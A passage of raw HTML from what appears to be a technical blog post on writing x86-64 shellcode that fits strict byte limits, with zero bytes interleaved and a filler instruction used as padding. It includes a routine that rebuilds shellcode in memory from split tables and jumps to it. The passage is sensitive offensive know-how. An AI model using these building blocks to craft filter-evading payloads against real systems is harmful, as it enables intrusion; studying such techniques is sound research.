#0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x1d\\x00\\x07\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sbb</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff000700</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:43:28 UTC --></p>\n<p>Two problems: SAHF is a byte we can&#8217;t use (0x9E) and even if we could, the ADD after the SAHF instruction modifies the flags register, resulting in EAX being set to 0 or -1. The result depends on the byte stored in address rbp contains and the value of CL.</p>\n<p>Adding -1 will subtract 1 from the variable EAX contains the address of.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x83\\x00\\xff\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">dword</span>  <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:46:22 UTC --></p>\n<p>Works fine, but because 0x83 converts to a double-byte encoding, we can&#8217;t use it.</p>\n<p>Set the Carry Flag (CF) with STC. Subtract 0 + CF from AL using SBB AL, 0, which sets AL to 0xFF. Create a variable set to 0 on the stack. Load the address of that variable into rdi. Store AL in variable four times before loading into RAX. Doesn&#8217;t work once the addition after STC is executed.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xf9\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stc</span>                       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x1c\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sbb</span>   <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>               <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>                   <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5f\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rdi</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xaa\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">stosb</span>                     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>                 <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:46:47 UTC --></p>\n<p>The next snippet simply copies the value of RCX to RAX. It&#8217;s overcomplicated and the POP QWORD instruction might be useful in some scenario. I just didn&#8217;t find it useful.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>              <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rsp            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rax            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x51\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  rcx            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x8f\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #800000; font-weight: bold;\">qword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x5f\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   rax            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 18:02:25 UTC --></p>\n<p>Adding registers is a problem, specifically when a carry occurs. Any operation on a 32-bit register automatically clears the upper 32-bits of a 64-bit register, so to perform addition and subtraction on addresses, ADD and SUB of 32-bit registers isn&#8217;t useful.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rcx\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rbp              <span style=\"color: #696969;\">; save rbp      </span>\n    xnop\n    <span style=\"color: #696969;\">; 1. ====================================</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">0</span>                <span style=\"color: #696969;\">; store 0 as X</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rsp              <span style=\"color: #696969;\">; store &amp;X</span>\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rbp              <span style=\"color: #696969;\">; load &amp;X</span>\n    xnop\n    <span style=\"color: #696969;\">; 2. ====================================</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xFF001200</span>  <span style=\"color: #696969;\">; load 0xFF001200</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ah</span>        <span style=\"color: #696969;\">; add 0x12</span>\n    <span style=\"color: #800000; font-weight: bold;\">adc</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>            <span style=\"color: #696969;\">; AL = CF</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rbp              <span style=\"color: #696969;\">; store &amp;X</span>\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rsp              <span style=\"color: #696969;\">; store &amp;&amp;X</span>\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax              <span style=\"color: #696969;\">; load &amp;&amp;X</span>\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">inc</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>       <span style=\"color: #696969;\">; &amp;X++</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rbp\n    xnop\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>        <span style=\"color: #696969;\">; add CF</span>\n    <span style=\"color: #696969;\">; 3. ====================================</span>\n</pre>\n<p>Finally, one that may or may not be useful. Imagine you have a shellcode and you want to reconstruct it in memory before executing. If the address of table 1 is in RAX, table 2 in RSI and R8 is zero, this next instruction might be useful. Every even byte of the shellcode would be stored in one table with every odd byte stored in another. Then at runtime, we combine the two. The only problem is getting R8 to zero because anything that uses it requires a REX prefix. I&#8217;m leaving here in the event R8 is already zero..</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">; read byte from table 2</span>\n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #008c00;\">+1</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>   <span style=\"color: #696969;\">; copy to table 1</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #008c00;\">+3</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #800000; font-weight: bold;\">lodsb</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #008c00;\">+5</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">al</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #696969;\">; and so on..</span>\n    \n    <span style=\"color: #696969;\">; execute</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span> rax\n    <span style=\"color: #800000; font-weight: bold;\">ret</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-07 19:07:23 UTC --></p>\n<p>Using the above instruction to add 8-bits to 32-bit word.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">; step 1</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">bl</span> <span style=\"color: #696969;\">; A[0] += B[0]</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">adc</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>            <span style=\"color: #696969;\">; set carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rcx              <span style=\"color: #696969;\">; load carry into CL</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax              <span style=\"color: #696969;\">; restore pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #696969;\">; step 2</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">rol</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">24</span>   \n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #696969;\">; A[1] += CF</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">adc</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>            <span style=\"color: #696969;\">; set carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save carry</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rcx              <span style=\"color: #696969;\">; load carry into CL</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax              <span style=\"color: #696969;\">; restore pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    \n    <span style=\"color: #696969;\">; step 3</span>\n    <span style=\"color: #800000; font-weight: bold;\">push</span>   rax              <span style=\"color: #696969;\">; save pointer</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">rol</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">24</span>    \n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>\n    <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span><span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>r8<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #696969;\">; A[2] += CF</span>\n    <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>\n    <span style=\"color: #800000; font-weight: bold;\">adc</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span 